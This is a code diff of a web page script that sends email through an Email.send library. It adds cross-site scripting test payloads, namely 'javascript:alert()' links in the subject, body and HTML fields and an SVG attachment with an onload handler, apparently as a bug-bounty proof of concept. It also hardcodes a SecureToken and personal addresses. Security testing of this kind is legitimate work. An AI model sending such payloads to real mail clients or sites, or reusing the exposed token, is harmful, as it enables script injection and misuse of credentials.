@@ -11,12 +11,17 @@
     <script>
         function test() {
             Email.send({
-               SecureToken : "01e27bbb-3250-4109-a868-efba00503bc9",
+                SecureToken : "01e27bbb-3250-4109-a868-efba00503bc9",
                 To : "flashitthackerone@hey.com,palanisamyown@gmail.com",
                 From: "leocarsgarage@gmail.com",
-                Subject: "Hey Testing",
-                Body:"hi",
-                html: "<h1>GeeksforGeeks</h1><br><a href='javascript:alert()'>A computer science portal</p>"
+                Subject: "<a href='javascript:alert()'>A computer science portal</a>",
+                Body:"<a href='javascript:alert()'>A computer science portal</a>",
+                html: "<h1>GeeksforGeeks</h1><br><a href='javascript:alert()'>A computer science portal</a>",
+                Attachments: [
+                  {
+                    name: "File_Name_with_Extension",
+                    data: "data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' onload='alert()' width='32' height='32' viewBox='0 0 32 32' fill='none'%3e%3c/svg%3e"
+                  }]
                 }).then(
                 message =>{
                     if(message=='OK'){
